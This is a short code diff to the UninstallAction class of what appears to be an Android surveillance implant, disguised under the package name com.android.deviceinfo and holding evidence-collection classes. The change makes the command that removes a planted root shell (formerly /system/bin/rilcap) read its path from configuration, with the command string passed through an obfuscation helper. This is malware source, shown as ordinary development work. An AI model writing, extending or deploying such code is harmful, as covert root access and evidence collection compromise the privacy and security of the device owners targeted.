@@ -22,6 +22,7 @@ import com.android.deviceinfo.Status;
 import com.android.deviceinfo.Trigger;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfAction;
+import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.evidence.EvidenceCollector;
 import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.listener.AR;
@@ -92,7 +93,7 @@ public class UninstallAction extends SubActionSlow {
 
 			try {
 				// /system/bin/ntpsvd ru (uninstall root shell)
-				localProcess = Runtime.getRuntime().exec(M.e("/system/bin/rilcap ru"));
+				localProcess = Runtime.getRuntime().exec(String.format(M.e("%s ru"), Configuration.shellFile));
 
 				localProcess.waitFor();
 			} catch (Exception e) {
